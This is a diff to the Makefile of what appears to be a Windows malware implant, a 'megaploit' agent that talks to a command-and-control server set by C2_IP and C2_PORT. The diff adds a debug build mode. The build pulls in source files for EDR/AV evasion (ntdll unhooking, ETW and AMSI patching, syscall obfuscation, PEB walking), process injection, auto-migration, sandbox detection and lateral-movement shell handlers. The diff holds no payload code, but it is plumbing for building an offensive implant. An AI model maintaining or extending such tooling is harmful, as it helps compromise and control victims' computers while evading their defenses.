@@ -156,8 +156,32 @@ endif
 # Source files
 # ---------------------------------------------------------------------------
 
+# ── Debug build support ──────────────────────────────────────────────────────
+# Pass DBG=1 on the make command line to compile a debug build:
+#   make C2_IP=... DBG=1
+#
+# Effects:
+#   • -DAGENT_DEBUG             — activates all dbg_*() calls in agent_debug.c
+#   • -DDISABLE_AUTO_MIGRATE    — keeps the agent in the original process
+#   • -DDISABLE_SANDBOX_CHECK   — skips the sandbox+delay so startup is instant
+#   • -DDISABLE_EVASION         — skips ntdll unhook/ETW/AMSI patches
+#   • Adds client/debug/agent_debug.c to the source list
+#
+# Log output: %TEMP%\megaploit_agent_debug.log  +  OutputDebugStringA
+# (readable live in x64dbg, WinDbg, or Sysinternals DbgView)
+
+ifeq ($(DBG),1)
+  _DBG_CFLAGS := -DAGENT_DEBUG -DDISABLE_AUTO_MIGRATE \
+                 -DDISABLE_SANDBOX_CHECK -DDISABLE_EVASION
+  _DBG_SRCS   := client/debug/agent_debug.c
+  $(info [DBG] Debug build enabled — log: %TEMP%\megaploit_agent_debug.log)
+else
+  _DBG_CFLAGS :=
+  _DBG_SRCS   :=
+endif
+
 # Refactored client/ build (preferred)
-CLIENT_SRCS := client/core/main.c               \
+CLIENT_SRCS := client/core/main.c                \
                client/evasion/spoof_obf.c        \
                client/evasion/peb_walk.c         \
                client/evasion/syscall_obf.c      \
@@ -169,7 +193,8 @@ CLIENT_SRCS := client/core/main.c               \
                client/shell/handlers_ui.c        \
                client/shell/handlers_lateral.c   \
                client/inject/inject.c            \
-               tls/tls_client.c
+               tls/tls_client.c                  \
+               $(_DBG_SRCS)
 
 # PE VERSIONINFO resource (client/inject/agent.rc)
 # Compiled to client/inject/agent.res by windres (MinGW) or rc.exe (MSVC) and
@@ -209,9 +234,9 @@ SERVER_LEGACY_SRCS := serverShell.c
 # /GL        â€" whole-program optimisation
 # /link /OPT:REF /OPT:ICF â€" dead-code elimination at link time
 MSVC_CFLAGS  := /nologo /W3 /O1 /GS- /Gy /GL /DNDEBUG \
-                /Iclient/core /Iclient/evasion /Iclient/inject /Iclient/shell /Itls \
+                /Iclient/core /Iclient/evasion /Iclient/inject /Iclient/shell /Iclient/debug /Itls \
                 /DC2_IP=\"$(C2_IP)\" /DC2_PORT=$(C2_PORT) $(_SK_FLAGS) $(_MN_FLAGS) \
-                $(_MIGRATE_FLAGS) $(_SC_SVC_FLAGS)
+                $(_MIGRATE_FLAGS) $(_SC_SVC_FLAGS) $(_DBG_CFLAGS)
 MSVC_LDFLAGS := /OPT:REF /OPT:ICF /LTCG
 MSVC_LIBS    := Secur32.lib Crypt32.lib ws2_32.lib bcrypt.lib Advapi32.lib User32.lib Shell32.lib
 
@@ -269,14 +294,15 @@ _INCLUDE_FLAG := $(if $(_CONFIG_HDR),-include megaploit_build_config.h,)
 
 # -I flags for the new subdirectory layout:
 #   each subdir needs its siblings + tls/ on the search path
-_CLIENT_INCLUDES := -Iclient/core -Iclient/evasion -Iclient/inject -Iclient/shell -Itls
+_CLIENT_INCLUDES := -Iclient/core -Iclient/evasion -Iclient/inject -Iclient/shell -Iclient/debug -Itls
 
 MINGW_CFLAGS := -Os -s -DNDEBUG -DUNICODE -D_UNICODE -DSECURITY_WIN32 \
                 -ffunction-sections -fdata-sections                     \
                 -fno-ident -fno-asynchronous-unwind-tables              \
                 $(_CLIENT_INCLUDES)                                      \
                 -DC2_IP=\"$(C2_IP)\" -DC2_PORT=$(C2_PORT) $(_SK_FLAGS) $(_MN_FLAGS) \
-                $(_MIGRATE_FLAGS) $(_SC_SVC_FLAGS) $(CFLAGS_EXTRA) $(_INCLUDE_FLAG)
+                $(_MIGRATE_FLAGS) $(_SC_SVC_FLAGS) $(CFLAGS_EXTRA) $(_INCLUDE_FLAG) \
+                $(_DBG_CFLAGS)
 MINGW_LDFLAGS := -Wl,--gc-sections -Wl,--strip-all
 MINGW_LIBS    := -lsecur32 -lcrypt32 -lws2_32 -lbcrypt -ladvapi32 -luser32 -lshell32 -mwindows
 
